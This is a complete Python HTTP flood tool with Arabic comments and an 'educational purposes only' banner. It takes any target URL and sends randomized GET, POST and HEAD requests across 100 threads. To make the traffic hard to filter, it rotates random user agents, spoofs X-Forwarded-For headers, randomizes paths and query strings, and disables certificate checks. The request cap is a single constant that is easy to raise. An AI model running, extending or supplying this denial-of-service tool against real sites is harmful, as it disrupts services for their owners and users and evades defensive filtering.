import urllib.request
import concurrent.futures
import random
import re
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
from halo import Halo
import faker
from fake_useragent import UserAgent
import string
import json
from urllib.parse import urlparse

# ======================
# قسم التهيئة والإعدادات
# ======================

class AttackConfig:
    """كل إعدادات الهجوم الأساسية"""
    VERSION = "9.1 PRO"
    AUTHOR = "Security Research Team"
    METHOD = "HTTP/HTTPS Mixed Flood"
    
    # إعدادات الأداء
    MAX_THREADS = 100  # تقليل عدد الثريدات لأغراض تعليمية
    REQUEST_TIMEOUT = 3
    KEEP_ALIVE = True
    RANDOMIZE_PATHS = True
    MAX_REQUESTS = 1000  # حد أقصى للطلبات

# تهيئة المكتبات
fake = faker.Faker()
ua = UserAgent()
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# ======================
# قسم الدوال المساعدة
# ======================

def generate_random_string(length=8):
    """توليد سلسلة عشوائية من الأحرف والأرقام"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_path():
    """توليد مسار URL عشوائي"""
    depths = random.randint(1, 3)  # تقليل العمق لأغراض تعليمية
    path = "/".join(generate_random_string(random.randint(3, 6)) for _ in range(depths))
    return "/" + path

def generate_malformed_headers(host):
    """توليد رؤوس HTTP مشوهة بشكل عشوائي"""
    base_headers = {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "*"]),
        "Connection": "keep-alive" if AttackConfig.KEEP_ALIVE else "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "must-revalidate"]),
        "Pragma": "no-cache",
        "Referer": random.choice([
            f"https://www.google.com/search?q={generate_random_string()}",
            f"https://www.bing.com/search?q={generate_random_string()}",
            f"https://{host}/"
        ]),
        "X-Forwarded-For": fake.ipv4(),
        "X-Request-ID": generate_random_string(16),
    }
    
    # إضافة رؤوس إضافية بنسبة 30%
    if random.random() < 0.3:
        base_headers.update({
            "X-HTTP-Method-Override": random.choice(["PUT", "DELETE"]),
            "X-Originating-IP": fake.ipv4(),
        })
    
    return base_headers

# ======================
# قسم نواة الهجوم
# ======================

class HTTPFlooder:
    def __init__(self):
        """تهيئة مهاجم HTTP"""
        self.counter = 0
        self.running = True
        self.start_time = time.time()
        self.lock = threading.Lock()
        
    def build_random_url(self, target):
        """بناء عنوان URL عشوائي"""
        parsed = urlparse(target)
        host = parsed.netloc
        path = generate_random_path() if AttackConfig.RANDOMIZE_PATHS else parsed.path
        
        # اختيار البروتوكول عشوائياً
        protocol = "https" if random.random() > 0.5 else "http"
        url = f"{protocol}://{host}{path}"
        
        # إضافة معلمات عشوائية
        if random.random() > 0.3:
            params = f"?{generate_random_string()}={generate_random_string()}"
            if random.random() > 0.5:
                params += f"&{generate_random_string()}={generate_random_string()}"
            url += params
            
        return url, host

    def send_single_request(self, target):
        """إرسال طلب HTTP واحد"""
        if self.counter >= AttackConfig.MAX_REQUESTS:
            return
            
        try:
            url, host = self.build_random_url(target)
            headers = generate_malformed_headers(host)
            method = random.choice(["GET", "POST", "HEAD"])
            
            req = urllib.request.Request(url, headers=headers, method=method)
            
            try:
                with urllib.request.urlopen(req, timeout=AttackConfig.REQUEST_TIMEOUT, context=context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0
                
            with self.lock:
                self.counter += 1
                self.print_status(status)
                
        except Exception as e:
            pass

    def print_status(self, last_status):
        """طباعة حالة الهجوم الحالية"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0
        status_msg = (
            f"{Fore.CYAN}[STATS]{Fore.RESET} "
            f"Time: {elapsed:.1f}s | "
            f"Requests: {Fore.YELLOW}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.GREEN}{rps:.1f}{Fore.RESET} | "
            f"Last Status: {Fore.CYAN}{last_status}{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def start_attack(self, target):
        """بدء الهجوم على الهدف"""
        print(f"\n{Fore.RED}[!] Starting attack on {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Method: {AttackConfig.METHOD}{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Max Threads: {AttackConfig.MAX_THREADS}{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Max Requests: {AttackConfig.MAX_REQUESTS}{Fore.RESET}\n")
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=AttackConfig.MAX_THREADS) as executor:
                futures = []
                while self.running and self.counter < AttackConfig.MAX_REQUESTS:
                    futures.append(executor.submit(self.send_single_request, target))
                    time.sleep(0.01)  # تجنب الحمل الزائد
                    
                concurrent.futures.wait(futures)
                
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")
            
        finally:
            elapsed = time.time() - self.start_time
            print(f"\n{Fore.RED}[!] Attack finished{Fore.RESET}")
            print(f"{Fore.YELLOW}Total requests: {self.counter}{Fore.RESET}")
            print(f"{Fore.YELLOW}Total time: {elapsed:.2f} seconds{Fore.RESET}")
            if elapsed > 0:
                print(f"{Fore.YELLOW}Requests per second: {self.counter/elapsed:.2f}{Fore.RESET}")

# ======================
# الواجهة الرئيسية
# ======================

def display_banner():
    """عرض شعار البرنامج"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
    {Fore.RED}
    ███████╗██╗      █████╗ ███████╗██╗  ██╗ ██████╗ ██████╗  ██████╗ 
    ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔═══██╗
    █████╗  ██║     ███████║███████╗███████║██║   ██║██████╔╝██║   ██║
    ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║
    ██║     ███████╗██║  ██║███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝
    ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
    {Fore.RESET}
    {Fore.CYAN}Version: {AttackConfig.VERSION} | Author: {AttackConfig.AUTHOR}{Fore.RESET}
    {Fore.YELLOW}This tool is for educational purposes only!{Fore.RESET}
    """
    print(banner)

def get_target_url():
    """الحصول على عنوان URL الهدف من المستخدم"""
    while True:
        url = input(f"{Fore.GREEN}[?] Enter target URL (or 'exit' to quit): {Fore.RESET}").strip()
        if url.lower() == 'exit':
            return None
        if not re.match(r'^https?://', url, re.IGNORECASE):
            print(f"{Fore.YELLOW}[!] Please include http:// or https://{Fore.RESET}")
            continue
        return url

def main():
    """الدالة الرئيسية للبرنامج"""
    display_banner()
    
    target = get_target_url()
    if not target:
        return
        
    flooder = HTTPFlooder()
    flooder.start_attack(target)

if __name__ == "__main__":
    main()